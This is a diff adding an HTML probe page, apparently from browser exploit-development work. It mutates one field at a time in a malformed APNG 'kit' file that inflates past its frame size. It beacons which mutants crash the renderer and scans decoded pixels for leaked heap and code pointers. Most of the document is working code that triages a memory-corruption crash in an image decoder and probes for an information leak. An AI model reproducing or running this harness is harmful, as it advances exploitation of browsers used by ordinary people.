@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V922</title></head>
+<body><pre id="out">V922 — field surgery on the REAL kit ctrl: which field drives the accepted-APNG death</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(t,d){
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon/V922-'+t+'?d='+encodeURIComponent(String(d===undefined?'':d).slice(0,600))+'&t='+Date.now(),false);x.send(null);}catch(e){}
+  O.textContent+='\n'+t+' '+(d===undefined?'':d);
+}
+
+/*
+ * v922 — v921 falsified both structural hypotheses: w=16384 WITH IDAT
+ * LOADED, no-IDAT shapes are REJECTED cleanly (my honest B2 rebuild does
+ * not even reproduce the kit death — something in the kit bytes differs).
+ * This probe stops rebuilding and performs FIELD SURGERY on the real kit
+ * ctrl bytes (fetched arraybuffer from /payloads/): one field patched per
+ * decode, CRC of the touched chunk recomputed, kit file otherwise
+ * byte-exact.
+ *
+ * Kit ctrl facts (measured): 204 B; IHDR 16384x1 depth8 color6;
+ * acTL num_frames=1 num_plays=0; fcTL seq=0 w=16384 h=1 delay=1/100
+ * dispose=0(NONE) blend=0(SOURCE); fdAT seq=1 declared 89 (4 seq + 85
+ * zlib), zlib inflates cleanly to 65537 B inside the declared span;
+ * remaining-after-dataStart = 105 = 89 + 4 CRC + 12 IEND. Kill set so far:
+ * fdAT len in {89, 90, 93(=probe-honest, reads CRC as data)}; reject set:
+ * {0, 4185}. Death = accepted file + frame pipeline.
+ *
+ * Surgery list (information-ordered):
+ *   M0 baseline          verbatim kit ctrl — baseline death in-harness
+ *   M1 zlib-corrupt      flip a byte inside the fdAT zlib stream
+ *                        (CRC fixed): still dies => death is PRE-inflate
+ *                        (geometry/allocation); survives/rejects => the
+ *                        death is inflate- or composite-driven (data-fed)
+ *   M2 dispose=1         fcTL dispose BACKGROUND — alternate composite path
+ *   M3 blend=1           fcTL blend BLEND-OVER — alternate composite path
+ *   M4 fcTL w=64         frame rect 64x1 (IHDR stays 16384x1; fdAT still
+ *                        inflates 65537 B => rect/data size mismatch)
+ *   M5 IHDR w=64         canvas 64x1 (fdAT inflates 65537 B => mismatch)
+ *   M6 num_frames=0      animation disabled — if it survives, the death
+ *                        requires the animation pipeline proper
+ *
+ * One decode per mutation; survivors continue in-process; deaths are
+ * marked by the pending mechanism. LOADED rows get the kit scan channels.
+ * ?r=1 resets.
+ */
+
+var CRC_T=(function(){var t=[],c,n,k;for(n=0;n<256;n++){c=n;for(k=0;k<8;k++)c=(c&1)?(0xEDB88320^(c>>>1)):(c>>>1);t[n]=c>>>0;}return t;})();
+function crc32(buf,start,end){var c=0xFFFFFFFF;for(var i=start;i<end;i++)c=(CRC_T[(c^buf[i])&0xFF]^(c>>>8))>>>0;return (c^0xFFFFFFFF)>>>0;}
+function fetchBytes(url,cb){
+  try{var x=new XMLHttpRequest();x.open('GET',url,true);x.responseType='arraybuffer';
+      x.onload=function(){cb(x.status===200?new Uint8Array(x.response):null);};
+      x.onerror=function(){cb(null);};x.send();
+  }catch(e){cb(null);}
+}
+/* locate chunks of the ctrl payload */
+function parseCtrl(b){
+  var pos=8,chunks=[];
+  while(pos+12<=b.length){
+    var len=((b[pos]<<24)|(b[pos+1]<<16)|(b[pos+2]<<8)|b[pos+3])>>>0;
+    var type=String.fromCharCode(b[pos+4],b[pos+5],b[pos+6],b[pos+7]);
+    chunks.push({off:pos,len:len,type:type,dataStart:pos+8});
+    pos=pos+12+len;
+  }
+  return chunks;
+}
+function fixCRC(b,ch){
+  var crc=crc32(b,ch.off+4,ch.off+8+ch.len);
+  b[ch.off+8+ch.len]=(crc>>>24)&255;b[ch.off+9+ch.len]=(crc>>>16)&255;b[ch.off+10+ch.len]=(crc>>>8)&255;b[ch.off+11+ch.len]=crc&255;
+}
+function toDataUrl(b){var s='';for(var i=0;i<b.length;i++)s+=String.fromCharCode(b[i]);return 'data:image/png;base64,'+btoa(s);}
+function scanImage(img,nm){
+  var cv=document.createElement('canvas');cv.width=img.width;cv.height=img.height;
+  var g=cv.getContext('2d');g.drawImage(img,0,0);
+  var id=g.getImageData(0,0,cv.width,cv.height);
+  var d=new Uint8Array(id.data.buffer);
+  var nz=0,heap=0,code=0,other=0,n=Math.min(d.length,65536);
+  for(var i=0;i<n;i+=4){if(d[i]||d[i+1]||d[i+2]||d[i+3])nz++;}
+  for(var j=0;j+8<=n;j+=8){
+    var hiU=((d[j+7]<<24)|(d[j+6]<<16)|(d[j+5]<<8)|d[j+4])>>>0;
+    if(hiU>=8&&hiU<=255)heap++;
+    else if(hiU>=1&&hiU<=7)code++;
+    else if(d[j]|d[j+1]|d[j+2]|d[j+3]|d[j+4]|d[j+5]|d[j+6]|d[j+7])other++;
+  }
+  return 'dims='+img.width+'x'+img.height+' nz4='+nz+' heap='+heap+' code='+code+' other8='+other;
+}
+
+var st={m:0,pending:null};
+try{
+  if(location.search.indexOf('r=1')>=0){localStorage.removeItem('v922_state');bk('RESET','cleared');}
+  else{var raw=localStorage.getItem('v922_state');if(raw)st=JSON.parse(raw);}
+}catch(e){}
+function save(){try{localStorage.setItem('v922_state',JSON.stringify(st));}catch(e){}}
+
+function run(){
+  if(st.m>=7){ bk('EXHAUSTED','surgery complete: see KILLER/LOADED rows — the surviving-vs-killing split names the driver'); return; }
+  fetchBytes('/payloads/v674_apng_ctrl.png', function(orig){
+    if(!orig){ bk('FETCH-FAIL','ctrl'); setTimeout(run,200); return; }
+    var chunks=parseCtrl(orig);
+    var byType={}; for(var i=0;i<chunks.length;i++) byType[chunks[i].type]=chunks[i];
+    var b=Array.prototype.slice.call(orig);
+    var desc='';
+    if(st.m===0){ desc='M0 baseline (verbatim kit ctrl)'; }
+    else if(st.m===1){ var f=byType.fdAT; b[f.dataStart+4+10]^=0xFF; fixCRC(b,f); desc='M1 fdAT zlib byte corrupted (CRC fixed)'; }
+    else if(st.m===2){ var f2=byType.fcTL; b[f2.dataStart+24]=1; fixCRC(b,f2); desc='M2 fcTL dispose=BACKGROUND'; }
+    else if(st.m===3){ var f3=byType.fcTL; b[f3.dataStart+25]=1; fixCRC(b,f3); desc='M3 fcTL blend=BLEND-OVER'; }
+    else if(st.m===4){ var f4=byType.fcTL; b[f4.dataStart+8]=0;b[f4.dataStart+9]=0;b[f4.dataStart+10]=0;b[f4.dataStart+11]=64; fixCRC(b,f4); desc='M4 fcTL w=64 (IHDR 16384x1, fdAT inflates 65537B)'; }
+    else if(st.m===5){ var f5=byType.IHDR; b[f5.dataStart]=0;b[f5.dataStart+1]=0;b[f5.dataStart+2]=0;b[f5.dataStart+3]=64; fixCRC(b,f5); desc='M5 IHDR w=64 (fdAT inflates 65537B)'; }
+    else if(st.m===6){ var f6=byType.acTL; b[f6.dataStart]=0;b[f6.dataStart+1]=0;b[f6.dataStart+2]=0;b[f6.dataStart+3]=0; fixCRC(b,f6); desc='M6 acTL num_frames=0'; }
+    st.pending={m:st.m,desc:desc}; save();
+    bk('ATTEMPT-PRE',desc+' (sync — the next event is decode/scan or the death)');
+    var img=new Image();
+    var killed=false;
+    var to=setTimeout(function(){ if(killed)return; killed=true;
+      bk('LOADTO','hang: '+desc); st.pending=null; st.m++; save();
+      setTimeout(function(){location.reload();},300);
+    },6500);
+    img.onload=function(){ clearTimeout(to); if(killed)return; killed=true;
+      st.pending=null; save();
+      try{ bk('LOADED',desc+' | '+scanImage(img,desc)); }catch(e){ bk('SCAN-ERR',e.name); }
+      st.m++; save(); setTimeout(function(){location.reload();},250);
+    };
+    img.onerror=function(){ clearTimeout(to); if(killed)return; killed=true;
+      st.pending=null; st.m++; save();
+      bk('DECODE-ERR',desc+' (rejected cleanly — context alive)');
+      setTimeout(function(){location.reload();},250);
+    };
+    img.src=toDataUrl(b);
+  });
+}
+if(st.pending){
+  var pk=st.pending; st.pending=null; save();
+  bk('KILLER','mut'+pk.m+' '+pk.desc+' — the context died decoding this mutant (row banked)');
+}
+run();
+</script></body></html>
